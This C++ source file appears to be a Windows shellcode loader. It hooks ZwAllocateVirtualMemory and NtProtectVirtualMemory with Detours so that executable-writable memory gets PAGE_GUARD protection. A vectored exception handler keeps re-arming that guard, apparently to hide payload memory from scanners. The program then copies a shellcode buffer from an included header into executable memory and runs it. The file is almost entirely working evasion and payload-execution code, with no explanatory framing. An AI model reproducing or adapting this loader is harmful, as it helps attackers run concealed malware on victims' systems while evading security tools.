#include <iostream>
#include <windows.h>
#include "loader.h"
#include <detours.h>


static LPVOID lastGuardAddress = nullptr;


static void AddPageGuardProtect(void* addr) {
    DWORD oldProtect;
    MEMORY_BASIC_INFORMATION mbi;
    SYSTEM_INFO sysInfo;

    GetSystemInfo(&sysInfo);
    VirtualQuery(addr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
    if ((mbi.Protect & PAGE_GUARD) != 0) {
        return;
    }
    VirtualProtect(addr, sysInfo.dwPageSize, mbi.Protect | PAGE_GUARD, &oldProtect);
}


LONG NTAPI ExceptionCallBack(struct _EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {

        lastGuardAddress = (LPVOID)ExceptionInfo->ExceptionRecord->ExceptionInformation[1];

        ExceptionInfo->ContextRecord->EFlags |= 0x100;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (lastGuardAddress != nullptr) {
            AddPageGuardProtect(lastGuardAddress);
            lastGuardAddress = nullptr;
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

void VEH_init() {
    AddVectoredExceptionHandler(1, &ExceptionCallBack);
}



typedef NTSTATUS(NTAPI* pZwAllocateVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
    );

HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
pZwAllocateVirtualMemory ZwAllocateVirtualMemory = (pZwAllocateVirtualMemory)(GetProcAddress(hNtdll, "ZwAllocateVirtualMemory"));
pZwAllocateVirtualMemory oriZwAllocateVirtualMemory = ZwAllocateVirtualMemory;


NTSTATUS NTAPI myZwAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
) {

    NTSTATUS status = oriZwAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);

    do {
        if (status != 0) {
            break;
        }
        if (ProcessHandle != GetCurrentProcess()) {
            break;
        }
        if (AllocationType != MEM_COMMIT) {
            break;
        }
        if (Protect != PAGE_EXECUTE_READWRITE) {
            break;
        }

        else
        {
            status = oriZwAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect | PAGE_GUARD);
        }

    } while (false);

    return status;

}

typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtection,
    _Out_ PULONG OldProtection
);
pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)(GetProcAddress(hNtdll, "NtProtectVirtualMemory"));
pNtProtectVirtualMemory oriNtProtectVirtualMemory = NtProtectVirtualMemory;

NTSTATUS NTAPI myNtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtection,
    _Out_ PULONG OldProtection
) {

    NTSTATUS status = oriNtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection);

    do {
        if (status != 0) {
            break;
        }
        if (ProcessHandle != GetCurrentProcess()) {
            break;
        }
        if (NewProtection != PAGE_EXECUTE_READWRITE) {
            break;
        }
        else
        {
            status = oriNtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtection|PAGE_GUARD, OldProtection);
        }

    } while (false);

    return status;
}


int main() {

    VEH_init();

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)oriZwAllocateVirtualMemory, myZwAllocateVirtualMemory);
    DetourAttach(&(PVOID&)oriNtProtectVirtualMemory, myNtProtectVirtualMemory);

    DetourTransactionCommit();

    LPVOID lpMem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // printf("%llx\n", lpMem);
    memcpy(lpMem, shellcode, sizeof(shellcode));



    ((void(*)(void)) lpMem)();



    return 0;

}